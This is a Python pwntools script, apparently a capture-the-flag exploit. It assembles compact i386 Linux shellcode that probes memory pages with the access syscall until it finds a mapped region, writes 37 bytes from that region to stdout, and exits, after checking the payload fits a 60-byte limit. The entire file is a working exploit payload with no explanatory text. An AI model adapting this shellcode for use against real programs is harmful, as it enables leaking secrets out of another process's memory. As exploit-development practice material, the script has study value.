#!/usr/bin/env python3

from pwn import *
from re import sub

shellcode = """
_start:
    mov ebx, 0x5ffff000
    xor ecx, ecx

loop:
    push 0x21       ; syscall access
    pop eax
    add ebx, 0x1000 ; access *pathname
    int 0x80
    cmp eax, 0xfffffff2 ; *pathname mem access error
    jz loop

write:
    push 0x4        ;syscall write
    pop eax
    xchg ebx, ecx   ;ebx = fd; ecx = *buf
    inc ebx
    push 0x25       ;len
    pop edx
    int 0x80;

exit:
    xor eax, eax
    mov ebx, eax
    inc eax       ;syscall exit
    int 0x80
"""

shellcode = re.sub(";.*\n", "\n", shellcode)

shellcode = asm(shellcode, arch = 'i386', os = 'linux')

if len(shellcode) > 0x3c:
    raise Exception('shellcode too long', len(shellcode))

print("shellcode len:", len(shellcode), file=sys.stderr)
print(disasm(shellcode), file=sys.stderr)

sys.stdout.buffer.write(shellcode)
